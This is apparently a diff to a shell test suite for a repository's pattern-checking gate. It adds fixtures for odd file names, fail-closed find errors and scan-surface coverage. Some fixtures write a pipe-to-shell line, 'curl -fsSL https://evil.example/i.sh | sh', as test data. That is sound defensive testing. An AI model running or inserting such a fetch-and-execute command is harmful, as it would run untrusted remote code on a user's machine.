@@ -15,7 +15,8 @@
 # `uname -m` in lib/os.sh, and each of those literals where it is legitimate;
 # SKIPS an absent optional dir (the fail-open regression that made the old inline
 # recipe silently pass), FAILS CLOSED on a scan error, and refuses a no-op scan.
-# Fixture trees only; never the real repo. Not on the shellcheck surface.
+# Fixture trees only: the real repo is listed (git ls-files), never scanned.
+# Not on the shellcheck surface.
 set -euo pipefail
 
 repo_root="$(cd "$(dirname "$0")/.." && pwd)"
@@ -881,18 +882,15 @@ else
   echo "  SKIP: running as root - cannot exercise arm 11's self-scan fail-closed case"
 fi
 
-# --- a check-patterns-named file ELSEWHERE (not bin/check-patterns) stays
-# excluded from the RECURSIVE scan, same as every other arm ------------------
-# Arm 11 keeps `--exclude=check-patterns` on its recursive scan for UNIFORMITY
-# with the other arms and with tests/plugins_test.sh's own invariant (every
-# recursive grep line in this script self-excludes, no per-arm exceptions).
-# That exclusion is a basename match, so it also exempts a same-named file
-# OUTSIDE bin/ - lib/ here, deliberately not bin/check-patterns, which is the
-# ONE path the narrow self-scan below now covers on its own (see the next
-# fixture). This one is a self-exclude proof, not a violation case.
+# --- a check-patterns-named file ELSEWHERE (not bin/check-patterns) fails
+# CLOSED --------------------------------------------------------------------
+# Every recursive arm keeps `--exclude=check-patterns` (tests/plugins_test.sh's
+# invariant), a BASE-NAME match at any depth, so such a file is never scanned.
+# Arm 12 refuses it instead, exit 2. Its own fixtures, with the nested and the
+# tracked cases, sit beside arm 12's other file-name rules below.
 r="$work/emdash-elsewhere"; seed "$r"; mkdir -p "$r/lib"
 printf '# a note %s trailing\n' "$em_dash" > "$r/lib/check-patterns"
-[ "$(run "$r")" = "0" ] && ok || fail "a file named check-patterns OUTSIDE bin/ must stay excluded from the em-dash arm's recursive scan"
+[ "$(run "$r")" = "2" ] && ok || fail "a file named check-patterns OUTSIDE bin/ must fail the gate closed (exit 2)"
 
 # --- an em dash literally in bin/check-patterns itself IS caught ------------
 # REGRESSION: the recursive scan's `--exclude=check-patterns` above means it
@@ -1129,8 +1127,24 @@ chmod u+x "$find_shim/find"
 # A FRESH shell: the shim must be the find a new process resolves.
 [ "$(PATH="$find_shim:$PATH" bash -c 'command -v find')" = "$find_shim/find" ] \
   || fail "the find shim is not the find a fresh process resolves"
+# Arm 12's file-name passes run find too, so each reports its own error; no
+# other message may fire.
 r="$work/sym-find-shim"; seed "$r"
-PATH="$find_shim:$PATH" fails_only_with "$r" "$sym_find_err_msg" "a find that exits non-zero must fail closed the symlink scan"
+out="$(PATH="$find_shim:$PATH" STRICT= "$cp" "$r" 2>&1)" && fail "a failing find: the gate passed"
+n_name_err=0
+while IFS= read -r line; do
+  case "$line" in
+    "$sym_find_err_msg"* | "check-patterns: SKIP "*) ;;
+    "check-patterns: file-name scan (find) errored"*) n_name_err=$((n_name_err + 1)) ;;
+    check-patterns:*) fail "a failing find: another message fired too: $line" ;;
+  esac
+done <<<"$out"
+case "$out" in
+  *"$sym_find_err_msg"*) ok ;;
+  *) fail "a find that exits non-zero must fail closed the symlink scan, got: $out" ;;
+esac
+[ "$n_name_err" -eq 2 ] && ok \
+  || fail "a find that exits non-zero must fail closed both file-name passes (got $n_name_err): $out"
 
 # --- FAIL CLOSED: a corrupted git index fails the repo-wide git pass, not a
 # silent pass ("no symlinks") -------------------------------------------------
@@ -1610,11 +1624,376 @@ git -C "$r" add -A && git -C "$r" commit -qm init
 GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1 GIT_TEST_ASSUME_DIFFERENT_OWNER=1 \
   fails_only_with "$r" "$sym_probe_msg" "a repo git refuses as dubiously owned must fail closed"
 
+# === arm (11): `-H` names the file even for a SINGLE operand ================
+# grep drops the PATH prefix when it gets one operand. A tree whose only
+# scanned path is install.sh hands arm 11 exactly one operand, so its report
+# must still read PATH:NN:, which only `-H` guarantees (GNU and BSD alike).
+r="$work/emdash-one-operand"; mkdir -p "$r"
+printf 'a note %s trailing\n' "$em_dash" > "$r/install.sh"
+out="$(STRICT= "$cp" "$r" 2>&1)" && fail "a lone em-dash operand: the gate passed"
+case "$out" in
+  *"$em_dash_msg"*) ;;
+  *) fail "a lone em-dash operand: expected '$em_dash_msg', got: $out" ;;
+esac
+case "$out" in
+  "$r/install.sh:1:a note $em_dash trailing"* | *$'\n'"$r/install.sh:1:a note $em_dash trailing"*) ok ;;
+  *) fail "a lone em-dash operand must be reported as PATH:NN: (grep -H), got: $out" ;;
+esac
+
+# === edge fixtures across the arms: no final newline, CRLF, `:` and space ===
+# Each arm must still fire, alone, and report the hit at ROOT/REL:1:, for a
+# file ending without a newline, CRLF line endings (a stray \r before the
+# line end) and a space in the name: shapes a line-oriented gate can drop. A
+# `:` in the name breaks the PATH:NN: split every arm relies on, so there the
+# gate must fail CLOSED (exit 2) whatever each arm reports. The names differ
+# by more than case: macOS's filesystem folds case.
+# _fails_closed ROOT MESSAGE LABEL [only] - exit 2 exactly, with MESSAGE; with
+# `only`, no other check-patterns line but a SKIP.
+names_msg="check-patterns: a file name holding ':', a newline or a CR"
+stray_msg="check-patterns: a file named check-patterns outside bin/"
+_fails_closed() {
+  local rc=0 out line
+  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
+  [ "$rc" = "2" ] || fail "$3: expected exit 2 (fail closed), got $rc: $out"
+  case "$out" in
+    *"$2"*) ;;
+    *) fail "$3: expected the message '$2', got: $out" ;;
+  esac
+  if [ "${4:-}" = only ]; then
+    while IFS= read -r line; do
+      case "$line" in
+        "$2"* | "check-patterns: SKIP "*) ;;
+        check-patterns:*) fail "$3: another message fired too: $line" ;;
+      esac
+    done <<<"$out"
+  fi
+  pass=$((pass + 1))
+}
+# _edge_case ROOT REL MESSAGE LABEL - fails_only_with, plus the hit line.
+_edge_case() {
+  local rc=0 out line hit=0
+  out="$(STRICT= "$cp" "$1" 2>&1)" || rc=$?
+  [ "$rc" != "0" ] || fail "$4: the gate passed"
+  case "$out" in
+    *"$3"*) ;;
+    *) fail "$4: expected the message '$3', got: $out" ;;
+  esac
+  while IFS= read -r line; do
+    case "$line" in
+      "$3"* | "check-patterns: SKIP "*) ;;
+      check-patterns:*) fail "$4: another message fired too: $line" ;;
+      "$1/$2:1:"*) hit=1 ;;
+    esac
+  done <<<"$out"
+  [ "$hit" -eq 1 ] || fail "$4: no hit reported at '$1/$2:1:', got: $out"
+  pass=$((pass + 1))
+}
+# ARM:DIR - the dir of each arm's surface the fixture file goes in. Arm 7
+# reads install.sh and lib/*.sh alone, so every name keeps the .sh suffix.
+for edge in 1:lib 2:lib 5:lib 6:lib 7:lib 8:tests 9:tests 10:tests 11:docs; do
+  arm="${edge%%:*}"; dir="${edge#*:}"
+  if [ "$arm" = 7 ]; then
+    pc="$b32_msg|declare -A m"
+  else
+    pc="$(_plug_case "$arm")"
+  fi
+  for variant in noeol crlf colon space; do
+    case "$variant" in
+      noeol) name="edge-noeol.sh"; fmt='%s' ;;
+      crlf) name="edge-crlf.sh"; fmt='%s\r\n' ;;
+      colon) name="edge:colon.sh"; fmt='%s\n' ;;
+      space) name="edge space.sh"; fmt='%s\n' ;;
+    esac
+    r="$work/edge-$arm-$variant"; seed "$r"; mkdir -p "$r/$dir"
+    # shellcheck disable=SC2059  # the format is one of the fixed ones above
+    printf "$fmt" "${pc#*|}" > "$r/$dir/$name"
+    if [ "$variant" = colon ]; then
+      _fails_closed "$r" "$names_msg" "arm $arm, $variant ($dir/$name)"
+    else
+      _edge_case "$r" "$dir/$name" "${pc%%|*}" "arm $arm, $variant ($dir/$name)"
+    fi
+  done
+done
+
+# --- arm 8's hits print sorted by PATH, then NUMERICALLY by line number:
+# line 9 before line 10 of one file, and one file's hits kept together
+# (edge-b.sh after all of edge.sh). A lexical key on the line number would
+# print 10 before 9.
+r="$work/edge-8-sort"; seed "$r"; mkdir -p "$r/tests"
+pc="$(_plug_case 8)"
+{ i=0; while [ "$i" -lt 8 ]; do printf ': filler\n'; i=$((i + 1)); done
+  printf '%s\n' "${pc#*|}" "${pc#*|}"; } > "$r/tests/edge.sh"
+printf '%s\n' "${pc#*|}" > "$r/tests/edge-b.sh"
+out="$(STRICT= "$cp" "$r" 2>&1)" || true
+got="$(printf '%s\n' "$out" | sed -n "s|^$r/tests/\\(edge[^/]*\\.sh:[0-9][0-9]*\\):.*|\\1|p")"
+want="edge-b.sh:1"$'\n'"edge.sh:9"$'\n'"edge.sh:10"
+[ "$got" = "$want" ] && ok \
+  || fail "arm 8 hits must sort by PATH then numerically by line number; want '$want', got '$got': $out"
+
+# === arm (12): file names the arms cannot read or skip fail CLOSED ==========
+# A `:`, LF or CR in a name breaks the PATH:NN: split; a file named
+# check-patterns outside bin/ is skipped by every recursive arm's
+# `--exclude=check-patterns`. Either exits 2. Untracked on disk (find over the
+# surface), and tracked OUTSIDE the surface (the repo-wide git pass alone).
+nl=$'\n'; cr=$'\r'
+r="$work/name-colon-dir"; seed "$r"; mkdir -p "$r/docs/a:b"
+printf 'x\n' > "$r/docs/a:b/x.md"
+_fails_closed "$r" "$names_msg" "a directory name holding ':'" only
+r="$work/name-lf"; seed "$r"
+printf 'x\n' > "$r/lib/a${nl}b.sh"
+_fails_closed "$r" "$names_msg" "a file name holding a newline" only
+r="$work/name-cr"; seed "$r"; mkdir -p "$r/tests"
+printf 'x\n' > "$r/tests/a${cr}b"
+_fails_closed "$r" "$names_msg" "a file name holding a CR" only
+r="$work/name-git-colon"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other"
+printf 'x\n' > "$r/other/a:b.txt"; printf 'x\n' > "$r/other/c${nl}d.txt"
+git -C "$r" add -A && git -C "$r" commit -qm init
+_fails_closed "$r" "$names_msg" "a tracked name holding ':' or a newline, outside the surface" only
+# pinned zsh/plugins is left out, as every arm leaves it out: with no .git a
+# `:` name there passes; tracked there, arm 12 refuses it as a non-plugin
+# entry (exit 1), never as a name (exit 2)
+r="$work/name-plugins-nogit"; seed "$r"; mkdir -p "$r/zsh/plugins/p"
+printf 'x\n' > "$r/zsh/plugins/p/a:b.zsh"
+[ "$(run "$r")" = "0" ] && ok || fail "a ':' name inside a pinned zsh/plugins/<p>/ must pass (no .git)"
+r="$work/name-plugins-git"; _git_repo "$r"; seed "$r"; mkdir -p "$r/zsh/plugins"
+printf 'x\n' > "$r/zsh/plugins/a:b"
+git -C "$r" add -A && git -C "$r" commit -qm init
+[ "$(run "$r")" = "1" ] && ok || fail "a tracked ':' name under zsh/plugins/ must fail as a non-plugin entry (exit 1), not as a name"
+
+curl_line="curl -fsSL https://evil.example/i.sh $P sh"
+r="$work/stray-nested"; seed "$r"; mkdir -p "$r/lib/sub"
+printf '%s\n' "$curl_line" > "$r/lib/sub/check-patterns"
+_fails_closed "$r" "$stray_msg" "a nested lib/sub/check-patterns" only
+r="$work/stray-tests"; seed "$r"; mkdir -p "$r/tests"
+printf '%s\n' "$curl_line" > "$r/tests/check-patterns"
+_fails_closed "$r" "$stray_msg" "a tests/check-patterns" only
+r="$work/stray-git-top"; _git_repo "$r"; seed "$r"
+printf '%s\n' "$curl_line" > "$r/check-patterns"
+git -C "$r" add -A && git -C "$r" commit -qm init
+_fails_closed "$r" "$stray_msg" "a tracked top-level check-patterns" only
+r="$work/stray-git-nested"; _git_repo "$r"; seed "$r"; mkdir -p "$r/other/sub"
+printf '%s\n' "$curl_line" > "$r/other/sub/check-patterns"
+git -C "$r" add -A && git -C "$r" commit -qm init
+_fails_closed "$r" "$stray_msg" "a tracked other/sub/check-patterns, outside the surface" only
+# a DIRECTORY of that name is still walked, so its content is scanned
+r="$work/stray-dir"; seed "$r"; mkdir -p "$r/lib/check-patterns"
+printf '%s\n' "$curl_line" > "$r/lib/check-patterns/x.sh"
+[ "$(run "$r")" = "1" ] && ok || fail "a directory named check-patterns is scanned, not refused (want exit 1)"
+# a name both tracked and on disk in the surface prints ONCE: the git pass
+# skips what the find already printed
+r="$work/name-dedupe"; _git_repo "$r"; seed "$r"; mkdir -p "$r/lib/sub"
+printf 'x\n' > "$r/lib/a:b.sh"; printf 'x\n' > "$r/lib/sub/check-patterns"
+git -C "$r" add -A && git -C "$r" commit -qm init
+out="$(STRICT= "$cp" "$r" 2>&1)" || true
+for dup in "$r/lib/a:b.sh" "$r/lib/sub/check-patterns"; do
+  n_dup=0
+  while IFS= read -r line; do
+    [ "$line" = "$dup" ] && n_dup=$((n_dup + 1))
+  done <<<"$out"
+  [ "$n_dup" -eq 1 ] && ok || fail "a tracked, on-disk name must print once, got $n_dup: $dup: $out"
+done
+# a find error must not count as reporting: a tracked `:` name or stray
+# check-patterns beside an unreadable dir is still listed by the git pass and
+# still exits 2. Root-skipped for the same `chmod 000` reason as the other
+# fail-closed cases.
+if [ "$(id -u)" -ne 0 ]; then
+  for fe in "lib/a:b.sh|$names_msg" "lib/sub/check-patterns|$stray_msg"; do
+    fe_rel="${fe%%|*}"
+    r="$work/name-finderr-$(printf '%s' "${fe_rel##*/}" | tr ':.' '--')"
+    _git_repo "$r"; seed "$r"; mkdir -p "$r/$(dirname "$fe_rel")" "$r/lib/locked"
+    printf 'x\n' > "$r/$fe_rel"
+    git -C "$r" add -A && git -C "$r" commit -qm init
+    chmod 000 "$r/lib/locked"
+    rc=0; out="$(STRICT= "$cp" "$r" 2>&1)" || rc=$?
+    chmod u+rwx "$r/lib/locked"
+    [ "$rc" = "2" ] && ok || fail "a find error beside a tracked $fe_rel must still exit 2, got $rc: $out"
+    # without the find error this is only the plain dedupe case: prove it fired
+    case "$out" in
+      *"file-name scan (find) errored"*) ok ;;
+      *) fail "a find error beside a tracked $fe_rel: the find error never fired: $out" ;;
+    esac
+    n_listed=0
+    while IFS= read -r line; do
+      [ "$line" = "$r/$fe_rel" ] && n_listed=$((n_listed + 1))
+    done <<<"$out"
+    case "$out" in
+      *"${fe#*|}"*) [ "$n_listed" -eq 1 ] && ok \
+        || fail "a find error beside a tracked $fe_rel: listed $n_listed times: $out" ;;
+      *) fail "a find error beside a tracked $fe_rel: expected '${fe#*|}', got: $out" ;;
+    esac
+  done
+else
+  echo "  SKIP: running as root - cannot exercise the file-name find-error cases"
+fi
+# the scan ROOT's own path holding `:` or a newline fails closed too, before
+# any arm runs, over a tree with a real arm 10 violation in it
+root_msg="check-patterns: the scan root"
+for r in "$work/rootcolon:1: #" "$work/rootlf-x${nl}y"; do
+  seed "$r"; mkdir -p "$r/tests"
+  printf '%s\n' "chmod -R go-w $D \"\$d\"" > "$r/tests/x_test.sh"
+  _fails_closed "$r" "$root_msg" "a scan root holding ':' or a newline: $r" only
+done
+# The newline root's first line half repeats once per descendant in the
+# case-collision guard's line-oriented listing below: remove it now.
+rm -rf "$work/rootlf-x${nl}y"
+# a GITLINK of that name is a directory too: refused as an unpinned gitlink
+# (exit 1), never as a stray file (exit 2)
+r="$work/stray-gitlink"; _git_repo "$r"; seed "$r"
+git -C "$r" add -A && git -C "$r" commit -qm init
+git -C "$r" update-index --add --cacheinfo \
+  160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,other/check-patterns
+[ "$(run "$r")" = "1" ] && ok || fail "a gitlink named check-patterns must fail as an unpinned gitlink (exit 1), not as a stray file"
+# exactly bin/check-patterns is the gate itself, tracked or not
+r="$work/stray-exact"; _git_repo "$r"; seed "$r"; mkdir -p "$r/bin"
+printf '#!/bin/sh\n: gate\n' > "$r/bin/check-patterns"
+[ "$(run "$r")" = "0" ] && ok || fail "an untracked bin/check-patterns must pass"
+git -C "$r" add -A && git -C "$r" commit -qm init
+[ "$(run "$r")" = "0" ] && ok || fail "a tracked bin/check-patterns must pass"
+
+# === the scanned surface covers every tracked top-level entry ===============
+# A new top-level file or dir must not escape every arm silently. Each tracked
+# top-level entry of THIS repo classifies as exactly one of:
+#   exempt  it is one of $cls_exempt, and then NO root may reach it;
+#   arm 8   else, every tracked path under it lies under an arm 8 root;
+#   arm 11  else, every tracked path under it lies under an arm 11 root;
+# ignoring only the paths under zsh/plugins/, the one excluded subtree, which
+# no root may reach either. Anything else fails. The
+# roots are READ FROM bin/check-patterns: a mirror of the tracked tree (empty
+# files, gitlinks as dirs) is scanned with a grep on PATH that logs its argv,
+# and the operands of arm 8's calls (the pattern holding `[sSwWbB<>]`) and of
+# arm 11's recursive call (the pattern being the em dash) are the roots. No
+# hand-kept copy of either list, so none can drift from the gate. The real
+# repo is only listed, never scanned.
+# NOT proven: that any OTHER arm reaches an entry. Arm 11 (em dash) is the
+# widest surface; arms 1, 2, 5 and 6 read only the shared install.sh, lib/,
+# bin/, zsh/, config/, packages/, security/ and home/, never docs/, tests/,
+# .github/ or .claude/.
+cls_exempt='LICENSES COPYING CODE_OF_CONDUCT.md'
+git -C "$repo_root" rev-parse --is-inside-work-tree >/dev/null 2>&1 \
+  || fail "surface coverage: $repo_root is not a git work tree - cannot list the tracked entries"
+cls_list="$work/cls-ls-files"
+git -C "$repo_root" ls-files -s -z > "$cls_list" \
+  || fail "surface coverage: git ls-files failed in $repo_root"
+cls_mirror="$work/cls-mirror"; mkdir -p "$cls_mirror"
+cls_paths=""
+while IFS= read -r -d '' entry; do
+  mode="${entry%% *}"; gpath="${entry#*$'\t'}"
+  mkdir -p "$cls_mirror/$(dirname "$gpath")"
+  if [ "$mode" = 160000 ]; then
+    mkdir -p "$cls_mirror/$gpath"
+  else
+    : > "$cls_mirror/$gpath"
+  fi
+  cls_paths="$cls_paths$gpath"$'\n'
+done < "$cls_list"
+[ -n "$cls_paths" ] || fail "surface coverage: git ls-files listed nothing"
+
+cls_shim="$work/cls-grep-shim"; mkdir -p "$cls_shim"
+printf '%s\n' '#!/bin/sh' \
+  '{ echo "@@CALL"; for a in "$@"; do printf "A%s\n" "$a"; done; } >> "$CLS_LOG"' \
+  'exec "$CLS_GREP" "$@"' > "$cls_shim/grep"
+chmod u+x "$cls_shim/grep"
+[ "$(PATH="$cls_shim:$PATH" bash -c 'command -v grep')" = "$cls_shim/grep" ] \
+  || fail "surface coverage: the grep shim is not the grep a fresh process resolves"
+# Resolved BEFORE the PATH prefix below: bash expands prefix assignments in
+# order, so a `$(command -v grep)` beside `PATH=shim:...` finds the shim, which
+# then execs itself forever.
+cls_grep="$(command -v grep)"
+case "$cls_grep" in
+  /*) [ "$cls_grep" != "$cls_shim/grep" ] || fail "surface coverage: the real grep resolved to the shim" ;;
+  *) fail "surface coverage: grep does not resolve to an absolute path: '$cls_grep'" ;;
+esac
+cls_log="$work/cls-grep-log"; : > "$cls_log"
+PATH="$cls_shim:$PATH" CLS_LOG="$cls_log" CLS_GREP="$cls_grep" STRICT= \
+  "$cp" "$cls_mirror" >/dev/null 2>&1 || true
+
+# _cls_flush - classify the call collected in cls_args, add its operands.
+cls_arm8=""; cls_arm11=""; cls_n11=0
+_cls_flush() {
+  local i=0 n="${#cls_args[@]}" rec=0 kind="" a rel
+  [ "$n" -gt 0 ] || return 0
+  while [ "$i" -lt "$n" ]; do
+    a="${cls_args[$i]}"; i=$((i + 1))
+    case "$a" in
+      -r* | -[!-]*r*) rec=1; continue ;;
+      *'[sSwWbB<>]'*) [ "$rec" -eq 1 ] && kind=8 ;;
+      "$em_dash") [ "$rec" -eq 1 ] && kind=11 ;;
+      *) continue ;;
+    esac
+    [ -n "$kind" ] && break
+  done
+  [ -n "$kind" ] || return 0
+  [ "$kind" = 11 ] && cls_n11=$((cls_n11 + 1))
+  while [ "$i" -lt "$n" ]; do
+    a="${cls_args[$i]}"; i=$((i + 1))
+    rel="${a#"$cls_mirror"/}"
+    [ "$rel" != "$a" ] || fail "surface coverage: arm $kind operand outside the mirror: $a"
+    if [ "$kind" = 8 ]; then cls_arm8="$cls_arm8$rel"$'\n'; else cls_arm11="$cls_arm11$rel"$'\n'; fi
+  done
+}
+cls_args=()
+while IFS= read -r line; do
+  if [ "$line" = "@@CALL" ]; then
+    _cls_flush; cls_args=()
+  else
+    cls_args+=("${line#A}")
+  fi
+done < "$cls_log"
+_cls_flush
+[ -n "$cls_arm8" ] || fail "surface coverage: found no arm 8 grep call in the log - the shim or the call shape changed"
+[ "$cls_n11" -eq 1 ] || fail "surface coverage: expected ONE arm 11 recursive grep call, found $cls_n11"
+
+# _cls_under PATH ROOTS - PATH is a root in ROOTS (one per line) or under one.
+_cls_under() {
+  local root
+  while IFS= read -r root; do
+    [ -n "$root" ] || continue
+    case "$1" in "$root" | "$root"/*) return 0 ;; esac
+  done <<<"$2"
+  return 1
+}
+# No root is zsh/plugins, lies under it, or lies ABOVE it (zsh itself as one
+# root would walk into it).
+while IFS= read -r root; do
+  [ -n "$root" ] || continue
+  case "$root" in
+    zsh/plugins | zsh/plugins/*) fail "surface coverage: a root reaches the pinned zsh/plugins: $root" ;;
+  esac
+  case "zsh/plugins/" in
+    "$root"/*) fail "surface coverage: a root sits above the pinned zsh/plugins: $root" ;;
+  esac
+done <<<"$cls_arm8$cls_arm11"
+cls_tops="$(printf '%s' "$cls_paths" | sed 's|/.*||' | LC_ALL=C sort -u)"
+for ex in $cls_exempt; do
+  case $'\n'"$cls_tops"$'\n' in
+    *$'\n'"$ex"$'\n'*) ;;
+    *) fail "surface coverage: exempt entry '$ex' is not tracked - drop it from the exempt set" ;;
+  esac
+done
+while IFS= read -r top; do
+  in8=1; in11=1; any=0
+  while IFS= read -r p; do
+    case "$p" in "$top" | "$top"/*) ;; *) continue ;; esac
+    case "$p" in zsh/plugins/*) continue ;; esac
+    if _cls_under "$p" "$cls_arm8"; then any=1; else in8=0; fi
+    if _cls_under "$p" "$cls_arm11"; then any=1; else in11=0; fi
+  done <<<"$cls_paths"
+  case " $cls_exempt " in
+    *" $top "*)
+      [ "$any" -eq 0 ] && ok \
+        || fail "surface coverage: exempt entry '$top' is now scanned - drop it from the exempt set, or keep it out of the gate" ;;
+    *)
+      { [ "$in8" -eq 1 ] || [ "$in11" -eq 1 ]; } && ok \
+        || fail "surface coverage: tracked top-level entry '$top' is on no arm 8 or arm 11 root and is not exempt - add it to the gate's surface" ;;
+  esac
+done <<<"$cls_tops"
+
 # --- no two paths anywhere under $work may differ only in case: macOS's
 # default filesystem folds case, so they would be ONE path there and the
 # second fixture (or file) would land on the first one's. Checked here, so a
-# case-sensitive Linux run catches it too. Line-oriented: no fixture creates
-# a name holding a newline, which would split into two lines here -----------
+# case-sensitive Linux run catches it too. Line-oriented: a name holding a
+# newline splits into two lines here, so each such fixture name is chosen
+# to leave both halves unique, or removed before this check ----------------
 case_dups="$(cd "$work" && find . | tr '[:upper:]' '[:lower:]' | LC_ALL=C sort | uniq -d)"
 [ -z "$case_dups" ] && ok \
   || fail "paths under \$work that differ only in case (one path on macOS): $case_dups"
